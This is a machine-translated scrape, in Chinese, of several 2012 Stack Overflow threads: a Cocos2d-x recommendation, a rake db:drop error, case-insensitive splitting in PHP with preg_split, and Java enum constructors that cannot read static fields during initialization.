> 时间：2012-11-24T11:04:45.287

我不知道这对你有帮助。我使用 Cocos2d-x。这个库和 cocos2d-android 一样，但是：

*   在 C++ 中工作，它比 Java 更快
*   是多平台的，可以在 iOS 和 Android 中编译，以及 HTML5
*   存在一个持有该项目的大社区，而 cocos2d-android 没有更多更新

存在[这个](https://stackoverflow.com/questions/10711047/the-completest-cocos2d-x-tutorial-guide-list)链接有很多教程开始。

# ruby-on-rails - 奇怪的行为 rake db:drop?

> ID：13524989
> 
> 赞同：2
> 
> 时间：2012-11-23T07:53:45.563
> 
> 标签：ruby-on-rails, ruby, rake

执行 rake db: drop .. 首先他会删除，然后显示结果，最初会出错！`Couldn't drop db_name: # <Mysql2::Error: Unknown database'db_name'>`..与创建基本相同..首先进行创建，然后编写该基础仍然存在！

# php - php分解大写小写

> ID：13524994
> 
> 赞同：1
> 
> 时间：2012-11-23T07:54:12.983
> 
> 标签：php, explode

```
$str='<html>...<header>...</header>...</html>';
//$str='<HTML>...<HEADER>...</HEADER>...</HTML>';
$header = explode("<header>", $str, 2);
echo $header[1]; 
```

我有很多 html 代码，我想要爆炸`header`标签，但有些`uppercase`是`lowercase`，因为`$str`非常巨大，我不想使用`str_replace()`将它们全部更改为 `uppercase`or `lowercase`，有没有简单的方法`header`从 a 中分解 2 部分的标签`$str`？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T07:56:14.477

有一种方法——preg_split() 函数！

没有测试正则表达式，但我认为这就是你要找的：

```
$header = preg_split("/<header>/i", $str); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T08:02:43.957

要使用explode和大写，您可以选择以下解决方案：

```
$pieces = explode(" ", strtoupper($pizza)); 
```

希望这对你有用。

谢谢

# java - 为什么枚举构造函数不能访问静态字段

> ID：13524996
> 
> 赞同：19
> 
> 时间：2012-11-23T07:54:22.470
> 
> 标签：java, enums

> **可能重复：**
> [为什么枚举的构造函数不能访问静态字段？](https://stackoverflow.com/questions/443980/why-cant-enums-constructor-access-static-fields)

```
enum Test {
  e1,e2;      

  int i=0;
  static int j=5;

  Test(){
    System.out.println(i+" "+j);
  }
} 
```

在上面的代码中，构造函数可以访问实例变量，但不能访问静态变量 J。

我已经阅读了与其他作者相关的答案，所有人都说在初始化 J（静态字段）之前初始化了 e1 和 e2，但是根据 java 规范，当类加载到内存时，所有静态字段都被初始化，即在运行之前构造函数。因此，在运行 Test() 构造函数之前，必须初始化静态变量 j。我无法理解限制，任何人都可以让我理解。我已经阅读了问题的答案[为什么枚举的构造函数不能访问静态字段？](https://stackoverflow.com/questions/443980/why-cant-enums-constructor-access-static-fields%22Why%20can%27t%20enum%27s%20constructor%20access%20static%20fields?%22)但我对这样的答案不满意：-在静态字段全部初始化之前调用构造函数。

假设如果再举一个像枚举这样的简单类的例子

```
class Test{
  public static final Test t=new Test();
  static int a=5;

  Test(){
    System.out.println(a);  
  }

  public static void main(String[] args) {
  }
} 
```

这里根据那里的论点，构造函数将在静态字段初始化之前运行，并且它也在运行，因为它打印 0（正如 JVM 进行了初始化）。但是没有编译错误或没有运行时问题。那么为什么枚举不会发生同样的事情。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T09:00:41.417

如果你想象你的枚举实际上是一个类的样子，那是有道理的：

```
public class Test {
  // Imagine you cannot move these two statements:
  public static final Test e1 = new Test();
  public static final Test e2 = new Test();

  int i=0;
  static int j=5;

  private Test(){
    System.out.println(i+ " " + j);
  }

  static int getJ() {
    return j;
  }

  public static void main(String[] args) {
    System.out.println(Test.getJ());
  }
} 
```

这打印：

```
0 0
0 0
5 
```

如果您可以分享一个具体示例（而不是理论示例），我们可以建议如何重新设计代码以实现所需的结果，尽管存在静态字段限制。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T08:30:38.337

问题是，枚举的实例是在静态字段的初始化期间创建的。他们在初始化静态字段之前创建。它们必须在静态数组值中并且可以静态访问，所以这是有道理的。正如对“为什么枚举的构造函数不能访问静态字段？”的回答中所述，不幸的是，这发生在所有用户定义的静态字段初始化之前。但是如果它被交换，你不能在静态初始化中访问枚举实例，所以它需要在创建枚举值之前和之后都允许静态块。

我不知道问题是因为枚举值的初始化是 Enum 类的问题（并且由 JVM 专门处理（此逻辑不在 Enum 类本身中），还是因为您不能将静态字段放在枚举值之前。

为什么这种方式只能回答少数人（例如，在 javadoc 中被称为 Enum 的作者的 Josh Bloch 和 Neal Gafter，也许还有一些不为人知的人）